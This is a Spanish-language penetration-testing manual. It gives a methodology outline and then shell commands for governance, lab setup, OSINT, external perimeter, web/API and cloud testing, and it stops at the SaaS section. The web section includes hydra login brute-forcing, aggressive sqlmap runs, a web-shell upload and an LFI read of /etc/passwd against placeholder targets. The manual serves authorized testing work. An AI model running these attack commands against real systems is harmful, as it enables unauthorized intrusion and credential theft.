# Manual de Pentesting

---

## 0. Gobierno, Legalidad y Seguridad Operacional
0.1 Autorizaciones formales: contrato, alcance, limitaciones, ventanas de prueba  
0.2 ROE (Rules of Engagement): tráfico permitido, horas, “kill-switch”, PII, datos sensibles  
0.3 Coordinación con Blue Team / Proveedores / NOC/SOC  
0.4 Gestión de riesgos: impacto, plan de contingencia, backups y rollback  
0.5 Evidencias y cadena de custodia (hashes, timestamps, journaling)  
0.6 Ética, privacidad y cumplimiento (RGPD, PCI, HIPAA, ISO 27001, NIST)  
0.7 Seguridad personal y del cliente: límites, prohibiciones, criterios de parada  

## 1. Preparación del Entorno de Trabajo
1.1 Plataforma de pruebas: SO base, VMs, contenedores, segmentación de laboratorio  
1.2 Redes de prueba: VPNs, jump-box, DNS controlado, proxy, logging centralizado  
1.3 Perfiles y roles: caja negra / gris / blanca; credenciales, accesos temporales  
1.4 Herramientas y “toolchains” (categorías):  
 • Recon pasivo, mapeo de red, análisis de servicios, web/API, móviles, cloud, Wi-Fi, AD, contenedores, CI/CD, forense ligero  
1.5 OPSEC: aislamiento, control de secretos, telemetría, registro de acciones  
1.6 Plantillas base: cuaderno de pruebas, checklist por dominio, formatos de evidencia  

## 2. Plan de Test y Modelado de Amenazas
2.1 Objetivos de negocio y hipótesis de ataque  
2.2 Modelos (STRIDE, MITRE ATT&CK, CAPEC) y “crown jewels”  
2.3 Definición de escenarios (externo, interno, wireless, cloud, físico, social)  
2.4 KPIs/KRIs y criterios de éxito  
2.5 Plan de comunicación (incidentes, hallazgos críticos, avisos en tiempo real)  

## 3. Reconocimiento Pasivo (OSINT & Footprinting)
3.1 Inventario de superficie pública: dominios, subdominios, ASN, rangos  
3.2 DNS/CT: registros públicos, CT logs, WHOIS, DNS histórico  
3.3 Huella tecnológica: servidores, frameworks, CDNs, WAFs, balanceadores  
3.4 Exposición de datos: repos públicos, fugas históricas, paste sites (si está permitido)  
3.5 Exposición en medios y RRSS (solo si está en alcance)  
3.6 Perfilado de proveedores, tercera parte y cadena de suministro  
3.7 Riesgos legales del OSINT y límites establecidos  

## 4. Perímetro Externo (Internet-Facing)
4.1 Descubrimiento de hosts y servicios (sin saturar; límites de tasa)  
4.2 Fingerprinting de servicios: protocolos comunes (HTTP(S), TLS, SSH, SMTP, DNS, RDP, VPN, VoIP)  
4.3 Evaluación de configuraciones y versiones (alto nivel)  
4.4 Análisis de TLS y políticas de seguridad (HSTS, cipher suites, expiry)  
4.5 Identificación de portales, paneles y superficies administrativas  
4.6 Validación de exposición indebida (listados, backups, endpoints “.old/.bak”)  
4.7 Evaluación de contramedidas: WAF/CDN, rate-limits, IP reputation  
4.8 Priorización de vectores y “quick wins” (no intrusivos)  

## 5. Aplicaciones Web y APIs (REST/SOAP/GraphQL/WebSocket)
5.1 Mapeo funcional y de contenido (rutas, roles, flujos, estados)  
5.2 Autenticación y gestión de sesión (2FA, SSO/OAuth/OIDC/SAML)  
5.3 Control de acceso e IDOR (vertical/horizontal)  
5.4 Validación de entrada: inyecciones (SQL/NoSQL/LDAP/OS/XXE), SSRF, deserialización  
5.5 Subida de ficheros, path traversal, LFI/RFI, template injection  
5.6 CSRF, XSS (reflejado/almacenado/DOM), Content-Security-Policy  
5.7 APIs: esquema/contratos, paginación, rate-limits, seguridad de endpoints  
5.8 HTTP/2, caching, WebSockets, gRPC (alto nivel)  
5.9 Aplicaciones SPA y clientes ricos (React/Vue/Angular)  
5.10 Pruebas de lógica de negocio: bypass de reglas, manipulación de flujos  
5.11 Pruebas de privacidad: PII, trazabilidad, retención  
5.12 Integraciones externas y secretos (claves, tokens, webhooks)  
5.13 Hallazgos críticos vs. baja probabilidad/alto impacto (priorización)  

## 6. Cloud (AWS/Azure/GCP/OCI/SaaS)
6.1 Descubrimiento de activos cloud públicos (objetos/buckets, endpoints)  
6.2 Revisión de identidades y permisos (principio de mínimo privilegio)  
6.3 Seguridad de datos: cifrado, versiones, políticas públicas/privadas  
6.4 Compute y serverless: perfiles, variables, secretos, metadata services (alto nivel)  
6.5 Redes y perímetros: SG/NSG, NACL, peering, egress/ingress  
6.6 Contenedores y orquestación (Docker/Kubernetes): imágenes, RBAC, exposiciones  
6.7 CI/CD y registries: integridad, secretos, firmados, supply chain  
6.8 SaaS: configuraciones seguras, acceso, sharing, DLP  
6.9 Evidencias y coordinación con el equipo cloud del cliente  

## 7. Red Interna (Assumed-Breach o acceso controlado)
7.1 Handover/control de entrada: credenciales, VLAN de pruebas, bastión  
7.2 Descubrimiento de red seguro y respetuoso  
7.3 Servicios internos críticos (AD/LDAP/Kerberos, SMB/NFS, bases de datos, RDP/VDI)  
7.4 Segmentación y salto entre subredes (validación de controles)  
7.5 Visión de AD (alto nivel): estructura, GPOs, trusts, hygiene  
7.6 Revisiones de configuraciones y exposición de secretos en compartidos  
7.7 Priorización de objetivos internos y plan de pruebas por oleadas  

## 8. Wireless & Radio
8.1 Política y alcance de pruebas Wi-Fi/BLE/NFC/RFID  
8.2 Recon pasivo y cobertura (no disruptivo)  
8.3 Configuración de seguridad Wi-Fi (WPA2/3, EAP, aislamiento de clientes)  
8.4 Redes de invitados, portales cautivos y segmentación  
8.5 BLE/NFC/RFID: perfiles, emparejamientos y autorizaciones (alto nivel)  
8.6 Pruebas de resiliencia y registros (coordinadas para no impactar)  

## 9. Móvil (Android/iOS)
9.1 Análisis estático: permisos, almacenamiento, secretos, hardening  
9.2 Análisis dinámico: tráfico, hooking, protección antimanipulación (alto nivel)  
9.3 APIs móviles y sincronización con backend  
9.4 Integración con proveedores (push, analytics, pagos)  
9.5 Gestión corporativa/MDM y pérdidas de dispositivo  

## 10. IoT / OT / Hardware (si está en alcance)
10.1 Inventario y topología; límites de seguridad (no romper equipos)  
10.2 Interfaz y firmware (extracción segura, análisis de configuración — alto nivel)  
10.3 Protocolos industriales y dependencias de seguridad  
10.4 Actualizaciones, arranque seguro, cadena de suministro del dispositivo  

## 11. Ingeniería Social (solo si se autoriza explícitamente)
11.1 Alcance, mensajes legales y “do-not-target list”  
11.2 Tipologías: vishing, smishing, simulación de phishing (alto nivel)  
11.3 Métricas de concienciación y coordinación con RRHH/Legal  
11.4 Red Team ejercicios controlados con “safewords”  

## 12. Physical (solo si se autoriza explícitamente)
12.1 Aprobaciones, seguridades y acompañamiento  
12.2 Observación de controles: accesos, CCTV, guardias, visitor flow (alto nivel)  
12.3 Validación de políticas (sin forzar cerraduras ni dañar activos)  

## 13. Post-Exposición (Data Handling & Impacto)
13.1 Validación responsable de hallazgos (sin explotación innecesaria)  
13.2 Demostración de impacto controlado (pruebas mínimas, entorno seguro)  
13.3 Manejo de datos sensibles: minimización, cifrado, borrado seguro  
13.4 Coordinación inmediata ante hallazgos críticos (stop-test)  

## 14. Resiliencia, Detección y Respuesta (Purple Team)
14.1 Mapeo de técnicas a ATT&CK (alto nivel)  
14.2 Señales de detección, reglas y telemetría  
14.3 Ejercicios controlados con Blue Team: validación de alertas y tiempos  

## 15. Limpieza y Restauración
15.1 Reversión de cambios temporales  
15.2 Eliminación de artefactos de prueba  
15.3 Verificación conjunta con el cliente  

## 16. Reporte y Remediación
16.1 Estructura del informe: ejecutivo, técnico, evidencias, riesgos (CVSS/NIST)  
16.2 Recomendaciones priorizadas, plan de remediación  
16.3 Reunión de cierre y plan de retest  

## 17. Retest y Verificación de Fixes
17.1 Validación de medidas aplicadas  
17.2 Evidencias post-remediación y actualización de riesgos  

## 18. Lecciones Aprendidas y Mejora Continua
18.1 Retroalimentación con stakeholders  
18.2 Actualización de playbooks y baselines  
18.3 Roadmap de madurez de seguridad  

## 19. Apéndices
A. Checklists por dominio (externo, web/API, cloud, interno, móvil, wireless, IoT, social, physical)  
B. Matrices de cobertura (OWASP ASVS/Top10, WSTG, PTES, NIST, ISO, CIS, ATT&CK)  
C. Plantillas: cuaderno de pruebas, registro de evidencias, informe ejecutivo/técnico  
D. Tabla de severidades y priorización  
E. Glosario y referencias

---

PUNTO 0 — Gobierno, Legalidad y Seguridad Operacional

Objetivo: Garantizar que todas las acciones de pentesting se realicen dentro del marco legal y operativo seguro, protegiendo al equipo y al cliente.

0.1 Autorizaciones formales

touch 00_preparacion/autorizaciones.txt

echo "Contrato revisado: Alcance completo, IPs, dominios, aplicaciones, servicios" >> 00_preparacion/autorizaciones.txt

echo "Firmas de cliente y responsables legales confirmadas" >> 00_preparacion/autorizaciones.txt

echo "Fechas y ventanas de prueba validadas y coordinadas con NOC/SOC" >> 00_preparacion/autorizaciones.txt

0.2 ROE (Rules of Engagement)

echo "ROE: solo pruebas autorizadas, no exfiltrar datos reales, alertar inmediatamente ante incidente crítico" >> 00_preparacion/roe.txt

echo "Niveles de intrusión permitidos: externo, interno, social, físico" >> 00_preparacion/roe.txt

0.3 Coordinación con Blue Team / Proveedores / NOC/SOC

echo "Contacto SOC: soc@cliente.com, teléfono de emergencia 24/7, protocolo de parada activo" >> 00_preparacion/comunicacion.txt

echo "Canales seguros de comunicación establecidos: Slack/Teams/Signal" >> 00_preparacion/comunicacion.txt

echo "Reglas de interacción, reportes automáticos y alertas definidas" >> 00_preparacion/comunicacion.txt

0.4 Gestión de riesgos

mkdir -p 00_preparacion/backups

cp /ruta/importante/* 00_preparacion/backups/

echo "Rollback listo ante cualquier interrupción" >> 00_preparacion/backups/plan.txt

echo "Criterios de priorización y escalamiento de incidentes establecidos" >> 00_preparacion/backups/plan.txt

0.5 Evidencias y cadena de custodia

find . -type f -exec sha256sum {} ; >> 00_preparacion/evidencias_hash.txt

echo "Fecha,Hora,Accion,Comando,Resultado" > 00_preparacion/evidencias.csv

0.6 Ética, privacidad y cumplimiento

gpg --symmetric --cipher-algo AES256 00_preparacion/evidencias.csv

echo "Cumplimiento normativo confirmado: RGPD, PCI, HIPAA, ISO 27001, NIST" >> 00_preparacion/evidencias.csv

echo "Manejo de PII: minimización, cifrado, borrado seguro" >> 00_preparacion/evidencias.csv

0.7 Seguridad personal y del cliente

export SECRET_PASS="valor_super_secreto"

echo $SECRET_PASS | gpg --symmetric --cipher-algo AES256 > 00_preparacion/secret.gpg

echo "Uso de entornos aislados: VMs, contenedores, VPN dedicadas" >> 00_preparacion/entorno.txt

echo "Prohibiciones claras y criterios de parada inmediata definidos" >> 00_preparacion/entorno.txt

Checklist final del Punto 0:

echo "[ ] Contrato revisado y firmado
[ ] ROE documentado
[ ] Canales de comunicación establecidos
[ ] Plan de contingencia creado
[ ] Evidencias y hashes listos
[ ] Cumplimiento normativo confirmado
[ ] Seguridad personal y del cliente definida" > 00_preparacion/checklist_punto0.txt

Resultado esperado:

echo "Autorización completa, reglas claras, canales de comunicación, plan de contingencia, registro de evidencia y criterios de seguridad establecidos" >> 00_preparacion/resultado_punto0.txt

PUNTO 1 — Preparación del Entorno de Trabajo

Objetivo: Configurar un laboratorio seguro y controlado, con herramientas, perfiles y registros listos para pentesting.

1.1 Plataforma de pruebas

mkdir -p 01_entorno/so

echo "SO base: Kali Linux / Parrot OS / Windows Lab VM" >> 01_entorno/so/config.txt

echo "VMs adicionales para contenedores y simulación de servidores" >> 01_entorno/so/config.txt

echo "Segmentación de laboratorio implementada: VLANs/Redes virtuales separadas" >> 01_entorno/so/config.txt

1.2 Redes de prueba

echo "VPN de laboratorio establecida" >> 01_entorno/red/config.txt

echo "Jump-box configurado para acceso controlado" >> 01_entorno/red/config.txt

echo "DNS controlado y logging centralizado activo" >> 01_entorno/red/config.txt

echo "Proxy de pruebas habilitado y filtrado de tráfico registrado" >> 01_entorno/red/config.txt

1.3 Perfiles y roles

echo "Roles definidos: caja negra / gris / blanca" >> 01_entorno/roles.txt

echo "Credenciales temporales gestionadas y registradas" >> 01_entorno/roles.txt

echo "Accesos y permisos documentados" >> 01_entorno/roles.txt

1.4 Herramientas y toolchains

mkdir -p 01_entorno/tools/recon_passivo

mkdir -p 01_entorno/tools/mapa_red

mkdir -p 01_entorno/tools/servicios

mkdir -p 01_entorno/tools/web_api

mkdir -p 01_entorno/tools/movil

mkdir -p 01_entorno/tools/cloud

mkdir -p 01_entorno/tools/wi_fi

mkdir -p 01_entorno/tools/ad

mkdir -p 01_entorno/tools/contenedores

mkdir -p 01_entorno/tools/forense_ligero

echo "Herramientas organizadas por categorías en 01_entorno/tools/" >> 01_entorno/tools/config.txt

1.5 OPSEC

echo "Aislamiento de entornos activo: no usar credenciales reales fuera del lab" >> 01_entorno/opsec.txt

echo "Control de secretos: variables de entorno cifradas" >> 01_entorno/opsec.txt

echo "Telemetría y registro de acciones habilitados" >> 01_entorno/opsec.txt

export SECRET_TOOL_PASS="valor_super_secreto_lab"

echo $SECRET_TOOL_PASS | gpg --symmetric --cipher-algo AES256 > 01_entorno/opsec/secret.gpg

1.6 Plantillas base

mkdir -p 01_entorno/plantillas

echo "Plantilla cuaderno de pruebas lista" >> 01_entorno/plantillas/cuaderno.md

echo "Checklist por dominio creada" >> 01_entorno/plantillas/checklist.md

echo "Formato de evidencia y reporte preparado" >> 01_entorno/plantillas/evidencia.md

Checklist final del Punto 1:

echo "[ ] SO base y VMs listas
[ ] Redes de laboratorio configuradas
[ ] Roles y credenciales definidos
[ ] Toolchains organizadas
[ ] OPSEC implementado
[ ] Plantillas base listas" > 01_entorno/checklist_punto1.txt

Resultado esperado:

echo "Laboratorio seguro, segmentado, herramientas organizadas, perfiles definidos, OPSEC activo, registros y plantillas listas para iniciar pruebas" >> 01_entorno/resultado_punto1.txt

PUNTO 2 — Plan de Test y Modelado de Amenazas

Objetivo: Definir objetivos claros de auditoría, escenarios de ataque y métricas de éxito antes de ejecutar cualquier prueba.

2.1 Objetivos de negocio y hipótesis de ataque

echo "Identificar activos críticos y crown jewels" >> 02_plan_test/objetivos.txt

echo "Hipótesis de ataque: externo, interno, social, físico, cloud, aplicaciones" >> 02_plan_test/hipotesis.txt

echo "Priorizar pruebas según impacto al negocio y criticidad de activos" >> 02_plan_test/prioridad.txt

2.2 Modelos de amenaza

echo "STRIDE: Spoofing, Tampering, Repudiation, Information Disclosure, Denial, Elevation" >> 02_plan_test/modelos.txt

echo "MITRE ATT&CK: mapear técnicas posibles a activos identificados" >> 02_plan_test/modelos.txt

echo "CAPEC: patrones de ataque comunes para simular escenarios realistas" >> 02_plan_test/modelos.txt

2.3 Definición de escenarios

echo "Escenarios externos: internet-facing, web, APIs, VPN" >> 02_plan_test/escenarios.txt

echo "Escenarios internos: red interna, segmentación, AD, SMB, bases de datos" >> 02_plan_test/escenarios.txt

echo "Wireless: pruebas Wi-Fi/BLE autorizadas, portales cautivos" >> 02_plan_test/escenarios.txt

echo "Cloud: AWS/Azure/GCP/SaaS, buckets, IAM, serverless, contenedores" >> 02_plan_test/escenarios.txt

echo "Social Engineering: phishing, vishing, simulación controlada (solo si está autorizado)" >> 02_plan_test/escenarios.txt

echo "Physical: acceso físico, validación de controles, CCTV, visitantes (solo si autorizado)" >> 02_plan_test/escenarios.txt

2.4 KPIs/KRIs y criterios de éxito

echo "KPIs: tiempo de descubrimiento de vulnerabilidades, % de activos explorados, hallazgos críticos detectados" >> 02_plan_test/kpi.txt

echo "KRIs: incidentes no planeados, alertas falsas, impacto mínimo al negocio" >> 02_plan_test/kri.txt

echo "Definir criterios de éxito: hallazgos validados, documentación completa, sin daños no autorizados" >> 02_plan_test/kpi.txt

2.5 Plan de comunicación

mkdir -p 02_plan_test/comunicacion

echo "Incidentes críticos: reportar inmediatamente a SOC/NOC y responsable legal" >> 02_plan_test/comunicacion/alertas.txt

echo "Hallazgos menores: documentar en cuaderno de pruebas, revisar en reuniones diarias" >> 02_plan_test/comunicacion/alertas.txt

echo "Canales seguros: Slack/Teams/Signal (según política cliente)" >> 02_plan_test/comunicacion/canales.txt

Checklist final del Punto 2:

echo "[ ] Objetivos de negocio definidos
[ ] Hipótesis de ataque documentadas
[ ] Modelos de amenaza aplicados (STRIDE, MITRE, CAPEC)
[ ] Escenarios de prueba definidos
[ ] KPIs/KRIs establecidos
[ ] Plan de comunicación preparado" > 02_plan_test/checklist_punto2.txt

Resultado esperado:

echo "Mapa completo de escenarios y objetivos de auditoría, métricas claras y canales de comunicación listos antes de iniciar pruebas activas" >> 02_plan_test/resultado_punto2.txt

PUNTO 3 — Reconocimiento Pasivo (OSINT & Footprinting)

Objetivo: Obtener la máxima información pública y de terceros sobre los objetivos sin interactuar directamente con sus sistemas. Preparar la base para escaneo activo y explotación posterior.

3.1 Inventario de superficie pública

mkdir -p 03_recon_pasivo

echo "Registrar dominios, subdominios, IPs públicas, ASN y rangos asociados" >> 03_recon_pasivo/inventario.txt

echo "Registrar servicios expuestos documentados por terceros" >> 03_recon_pasivo/inventario.txt

3.2 DNS/CT

echo "WHOIS básico: whois dominio.com" >> 03_recon_pasivo/dns.txt

echo "DNS histórico y logs de certificados: crt.sh/?q=dominio.com" >> 03_recon_pasivo/dns.txt

echo "NSLookup: nslookup dominio.com" >> 03_recon_pasivo/dns.txt

echo "Dig avanzado: dig dominio.com ANY +noall +answer" >> 03_recon_pasivo/dns.txt

3.3 Huella tecnológica

echo "Identificar frameworks, servidores, CDNs, WAFs, balanceadores" >> 03_recon_pasivo/huella.txt

whatweb dominio.com >> 03_recon_pasivo/huella.txt

wappalyzer-cli dominio.com >> 03_recon_pasivo/huella.txt

3.4 Exposición de datos

echo "Repositorios públicos y fugas históricas: GitHub, GitLab, pastebin" >> 03_recon_pasivo/datos.txt

echo "Buscar leaks simulados en entornos de laboratorio autorizados" >> 03_recon_pasivo/datos.txt

theHarvester -d dominio.com -b all >> 03_recon_pasivo/datos.txt

3.5 Exposición en medios y RRSS (si está en alcance)

echo "Recopilar información de perfiles corporativos y de empleados" >> 03_recon_pasivo/media.txt

echo "Registrar menciones públicas que puedan ser usadas en phishing o ingeniería social" >> 03_recon_pasivo/media.txt

3.6 Perfilado de proveedores y cadena de suministro

echo "Identificar subcontratistas, servicios de cloud, dependencias críticas" >> 03_recon_pasivo/cadena_suministro.txt

echo "Registrar configuraciones expuestas públicamente de terceros" >> 03_recon_pasivo/cadena_suministro.txt

3.7 Riesgos legales y límites del OSINT

echo "Confirmar que solo se usan fuentes públicas o simuladas" >> 03_recon_pasivo/legal.txt

echo "No interactuar con sistemas externos sin autorización explícita" >> 03_recon_pasivo/legal.txt

Checklist final del Punto 3:

echo "[ ] Inventario de superficie pública completo
[ ] WHOIS, DNS y logs de certificados revisados
[ ] Huella tecnológica identificada
[ ] Exposición de datos documentada
[ ] Medios y RRSS revisados
[ ] Perfilado de proveedores y cadena de suministro completado
[ ] Límites legales verificados" > 03_recon_pasivo/checklist_punto3.txt

Resultado esperado:

echo "Mapa inicial de superficie del objetivo basado en información pública, sin interacción directa con sistemas, listo para escaneo activo" >> 03_recon_pasivo/resultado_punto3.txt

PUNTO 4 — Perímetro Externo (Internet-Facing)

Objetivo: Evaluar los sistemas accesibles desde Internet, identificar servicios expuestos, configuraciones inseguras y posibles vectores de ataque de manera controlada y autorizada.

4.1 Descubrimiento de hosts y servicios

mkdir -p 04_perimetro_externo

echo "Escaneo de rangos y hosts públicos (respetando límites de tasa):" >> 04_perimetro_externo/descubrimiento.txt

nmap -p- -T4 --open IP_DEL_OBJETIVO -oN 04_perimetro_externo/puertos_abiertos.txt

masscan IP_DEL_OBJETIVO -p1-65535 --rate 1000 -oG 04_perimetro_externo/masscan.txt

4.2 Fingerprinting de servicios

echo "Identificar servicios y versiones" >> 04_perimetro_externo/fingerprinting.txt

nmap -sV -sC -pPUERTOS IP_DEL_OBJETIVO -oN 04_perimetro_externo/fingerprinting.txt

whatweb http://IP_DEL_OBJETIVO >> 04_perimetro_externo/fingerprinting.txt

nikto -h http://IP_DEL_OBJETIVO >> 04_perimetro_externo/fingerprinting.txt

4.3 Evaluación de configuraciones y versiones

echo "Revisar configuraciones de servicios detectados (SSH, HTTP, SMTP, DNS, RDP, VPN, VoIP)" >> 04_perimetro_externo/config_version.txt

ssh -v usuario@IP_DEL_OBJETIVO

nc IP_DEL_OBJETIVO 22

dig @IP_DEL_OBJETIVO dominio.com AXFR

4.4 Análisis de TLS y políticas de seguridad

echo "Validar certificados, HSTS, cipher suites, expiración y revocación" >> 04_perimetro_externo/tls.txt

nmap --script ssl-enum-ciphers -p 443 IP_DEL_OBJETIVO -oN 04_perimetro_externo/tls.txt

testssl.sh https://IP_DEL_OBJETIVO >> 04_perimetro_externo/tls.txt

4.5 Identificación de portales y superficies administrativas

echo "Buscar paneles de administración, endpoints ocultos y directorios sensibles" >> 04_perimetro_externo/admin.txt

gobuster dir -u http://IP_DEL_OBJETIVO -w /usr/share/wordlists/dirb/common.txt -o 04_perimetro_externo/admin.txt

dirsearch -u http://IP_DEL_OBJETIVO -e php,html,js >> 04_perimetro_externo/admin.txt

4.6 Validación de exposición indebida

echo "Detectar backups, archivos antiguos, endpoints .old/.bak/.zip" >> 04_perimetro_externo/exposicion.txt

find /mnt/repositorios/ -name ".bak" -o -name ".old" >> 04_perimetro_externo/exposicion.txt

curl -I http://IP_DEL_OBJETIVO/backup.zip >> 04_perimetro_externo/exposicion.txt

4.7 Evaluación de contramedidas

echo "Verificar WAF/CDN, rate-limits y reputación IP" >> 04_perimetro_externo/contramedidas.txt

nmap --script http-waf-detect -p 80,443 IP_DEL_OBJETIVO >> 04_perimetro_externo/contramedidas.txt

curl -I http://IP_DEL_OBJETIVO/testrate >> 04_perimetro_externo/contramedidas.txt

4.8 Priorización de vectores y quick wins

echo "Documentar hallazgos con probabilidad/impacto y seleccionar vectores para pruebas intrusivas controladas" >> 04_perimetro_externo/priorizacion.txt

Checklist final del Punto 4:

echo "[ ] Hosts descubiertos y servicios enumerados
[ ] Fingerprinting completado
[ ] Configuraciones y versiones revisadas
[ ] TLS y políticas de seguridad analizadas
[ ] Superficies administrativas identificadas
[ ] Exposición indebida documentada
[ ] Contramedidas evaluadas
[ ] Vectores priorizados para pruebas controladas" > 04_perimetro_externo/checklist_punto4.txt

Resultado esperado:

echo "Mapa completo de la exposición externa, servicios, configuraciones y vectores priorizados, listo para pruebas de intrusión controladas" >> 04_perimetro_externo/resultado_punto4.txt

PUNTO 5 — Aplicaciones Web y APIs (REST/SOAP/GraphQL/WebSocket)

Objetivo: Evaluar de forma exhaustiva la seguridad de aplicaciones web y APIs, identificar vulnerabilidades críticas y validar controles de acceso, autenticación, lógica de negocio y exposición de datos.

5.1 Mapeo funcional y de contenido

mkdir -p 05_web_api

echo "Enumeración de rutas, roles, flujos y estados" >> 05_web_api/mapeo.txt

gobuster dir -u http://IP_DEL_OBJETIVO -w /usr/share/wordlists/dirb/common.txt -o 05_web_api/rutas.txt

dirsearch -u http://IP_DEL_OBJETIVO -e php,html,js >> 05_web_api/rutas.txt

OWASP ZAP / Burp Suite: spider, crawl y proxy para identificar rutas y flujos de usuario

5.2 Autenticación y gestión de sesión

echo "Pruebas de autenticación y manejo de sesiones" >> 05_web_api/autenticacion.txt

hydra -L usuarios.txt -P passwords.txt http-post-form "/login:username=^USER^&password=^PASS^:Fallo" -t 16 -o 05_web_api/bruteforce.txt

JWT: jwt_tool, jwt.io para analizar tokens, expiraciones, algoritmos y firma

Validar 2FA, SSO, OAuth/OIDC/SAML mediante test controlado

5.3 Control de acceso e IDOR

echo "Verificación de accesos verticales y horizontales" >> 05_web_api/control_acceso.txt

curl -X GET http://IP_DEL_OBJETIVO/usuarios/ID -H "Authorization: Bearer TOKEN" >> 05_web_api/control_acceso.txt

Burp Repeater para manipular parámetros y comprobar IDOR

5.4 Validación de entrada

echo "Pruebas de inyecciones y manipulación de entradas" >> 05_web_api/validacion_entrada.txt

SQLi: sqlmap -u "http://IP_DEL_OBJETIVO/page.php?id=1" --batch --level=5 --risk=3 -o 05_web_api/sqlmap.txt

NoSQLi: noSQLMap, fuzzing de payloads JSON

LDAPi, OS command injection, XXE, SSRF: Burp Suite + payloads controlados

Fuzzing: wfuzz -c -w payloads.txt http://IP_DEL_OBJETIVO/FUZZ >> 05_web_api/fuzzing.txt

5.5 Subida de ficheros, path traversal, LFI/RFI, template injection

echo "Pruebas de subida y rutas críticas" >> 05_web_api/subida.txt

curl -F "file=@shell.php" http://IP_DEL_OBJETIVO/upload >> 05_web_api/subida.txt

LFI/RFI: curl http://IP_DEL_OBJETIVO/page.php?file=../../etc/passwd >> 05_web_api/lfi.txt

Template injection: {{7*7}} con Burp Repeater, revisión de templates (Jinja, Twig, Velocity)

5.6 CSRF, XSS y Content-Security-Policy

echo "Pruebas de CSRF y XSS" >> 05_web_api/xss_csrf.txt

XSStrike, Dalfox: pruebas de XSS reflejado, almacenado y DOM

Pruebas CSRF con tokens manipulados y observación de comportamiento

Validar cabeceras CSP, X-Frame-Options, X-XSS-Protection

5.7 APIs: esquema/contratos, paginación, rate-limits, seguridad de endpoints

echo "Revisión de endpoints REST, SOAP, GraphQL y WebSocket" >> 05_web_api/apis.txt

Postman / Burp Suite: inspección de contratos y respuestas

Fuzzing de parámetros y paginación (bypasses, IDOR, información sensible)

Validación de rate limits y throttling

5.8 HTTP/2, caching, WebSockets, gRPC

echo "Evaluar protocolos y comportamiento" >> 05_web_api/protocolos.txt

h2c-fuzzer para HTTP/2 testing

wscat -c ws://IP_DEL_OBJETIVO/socket

grpcurl para APIs gRPC

5.9 Aplicaciones SPA y clientes ricos

echo "Análisis de React, Angular, Vue" >> 05_web_api/spa.txt

Revisar bundle JS, endpoints internos, almacenamiento local y cookies seguras

Validar lógica de autorización en el cliente y en API backend

5.10 Pruebas de lógica de negocio

echo "Bypass de reglas y manipulación de flujos" >> 05_web_api/logica_negocio.txt

Modificación de parámetros de compra, créditos o permisos usando Burp Repeater

Verificación de integridad de datos y transacciones

5.11 Pruebas de privacidad

echo "Validar exposición de PII y trazabilidad" >> 05_web_api/privacidad.txt

Comprobar registros accesibles, ficheros públicos, leaks históricos

Revisar cifrado en tránsito y en reposo

5.12 Integraciones externas y secretos

echo "Pruebas sobre keys, tokens y webhooks" >> 05_web_api/integraciones.txt

Buscar hardcoded secrets en JS/Python/JSON

Revisar endpoints de integración con terceros (sandbox o entorno controlado)

5.13 Priorización y reporte de hallazgos

echo "Clasificación de hallazgos según probabilidad e impacto" >> 05_web_api/priorizacion.txt

CVSS scoring, documentación de vectores explotables, captura de requests/responses

Checklist final del Punto 5:

echo "[ ] Mapeo funcional completo
[ ] Autenticación y sesión evaluadas
[ ] Control de acceso revisado
[ ] Validación de entradas realizada
[ ] Subida de ficheros y rutas críticas probadas
[ ] CSRF/XSS y políticas de seguridad validadas
[ ] APIs evaluadas
[ ] Protocolos y clientes SPA revisados
[ ] Lógica de negocio probada
[ ] Privacidad y PII comprobadas
[ ] Integraciones externas revisadas
[ ] Hallazgos priorizados y documentados" > 05_web_api/checklist_punto5.txt

Resultado esperado:

echo "Mapa completo de la seguridad web y API, hallazgos críticos identificados, vectores intrusivos controlados listos para explotación autorizada" >> 05_web_api/resultado_punto5.txt

PUNTO 6 — Cloud (AWS/Azure/GCP/OCI/SaaS)

Objetivo: Evaluar la seguridad de entornos cloud, incluyendo exposición pública, permisos, datos, redes, contenedores y pipelines, con consentimiento del cliente y siguiendo buenas prácticas de auditoría extrema.

6.1 Descubrimiento de activos cloud públicos

mkdir -p 06_cloud

echo "Enumeración de buckets, blobs y endpoints expuestos públicamente" >> 06_cloud/descubrimiento.txt

AWS S3: aws s3 ls s3://nombre-bucket --no-sign-request >> 06_cloud/s3_publicos.txt

Azure Blob: az storage blob list --account-name NOMBRE --container-name CONTENEDOR --output table

GCP Storage: gsutil ls gs://BUCKET_PUBLICO

Enumeración de endpoints expuestos con nmap y masscan si son IPs públicas

6.2 Revisión de identidades y permisos

echo "Comprobación de roles, políticas, permisos excesivos" >> 06_cloud/identidades.txt

AWS IAM: aws iam list-users; aws iam list-roles; aws iam simulate-principal-policy --policy-source-arn arn:aws:iam::ACCOUNT:role/ROL --action-names s3:*

Azure RBAC: az role assignment list --all >> 06_cloud/azure_roles.txt

GCP IAM: gcloud projects get-iam-policy PROJECT_ID >> 06_cloud/gcp_roles.txt

Validar principio de mínimo privilegio y credenciales expuestas

6.3 Seguridad de datos

echo "Verificación de cifrado, versiones, políticas de acceso" >> 06_cloud/datos.txt

AWS: aws s3api get-bucket-encryption --bucket NOMBRE_BUCKET

Azure: az storage container show --name CONTENEDOR --account-name NOMBRE --query properties

GCP: gsutil iam get gs://BUCKET

Comprobar versionado habilitado, cifrado en tránsito y en reposo

6.4 Compute y serverless

echo "Revisión de instancias, funciones y metadata services" >> 06_cloud/compute.txt

Enumerar EC2/Azure VM/GCP Compute: aws ec2 describe-instances >> 06_cloud/ec2.txt

Serverless: aws lambda list-functions >> 06_cloud/lambda.txt

Revisar variables de entorno y secretos expuestos: printenv en VMs de prueba, revisión de Environment Variables en funciones

6.5 Redes y perímetros

echo "Evaluación de SG/NSG, NACL, peering y tráfico egress/ingress" >> 06_cloud/redes.txt

AWS: aws ec2 describe-security-groups >> 06_cloud/sg.txt

Azure: az network nsg list >> 06_cloud/nsg.txt

GCP: gcloud compute firewall-rules list >> 06_cloud/firewalls.txt

Revisar reglas abiertas a Internet y peering mal configurado

6.6 Contenedores y orquestación

echo "Revisión de Docker/Kubernetes, RBAC, imágenes y exposiciones" >> 06_cloud/contenedores.txt

kubectl get pods, deployments, services, secrets --all-namespaces >> 06_cloud/k8s.txt

Verificar imágenes firmadas, repositorios privados y secretos en ConfigMaps o Secrets

Docker: docker images, docker inspect, revisión de mounts y variables de entorno

6.7 CI/CD y registries

echo "Integridad de pipelines, secretos y supply chain" >> 06_cloud/cicd.txt

GitHub Actions / GitLab CI: revisar workflows expuestos, secretos y tokens

Trivy / Clair: escaneo de vulnerabilidades en imágenes de contenedor

Validar firma de artefactos y control de versiones

6.8 SaaS

